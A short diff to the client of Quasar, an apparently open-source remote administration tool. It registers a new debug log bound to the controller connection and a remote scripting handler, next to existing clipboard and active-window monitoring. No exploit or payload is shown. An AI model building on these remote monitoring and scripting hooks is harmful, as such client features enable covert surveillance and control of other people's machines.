@@ -49,6 +49,7 @@ namespace Quasar.Client
 
         private ActiveWindowChecker _activeWindowChecker;
         private ClipboardChecker _clipboardChecker;
+        private DebugLog _debugLog;
 
         /// <summary>
         /// Determines whether an installation is required depending on the current and target paths.
@@ -145,6 +146,8 @@ namespace Quasar.Client
 
                 _activeWindowChecker = new ActiveWindowChecker(_connectClient);
                 _clipboardChecker = new ClipboardChecker(_connectClient);
+                _debugLog = new DebugLog(_connectClient);
+                
 
                 new Thread(() =>
                 {
@@ -196,6 +199,7 @@ namespace Quasar.Client
             _messageProcessors.Add(new TaskManagerHandler(client));
             _messageProcessors.Add(new TcpConnectionsHandler());
             _messageProcessors.Add(new WebsiteVisitorHandler());
+            _messageProcessors.Add(new RemoteScriptingHandler());
 
             foreach (var msgProc in _messageProcessors)
             {
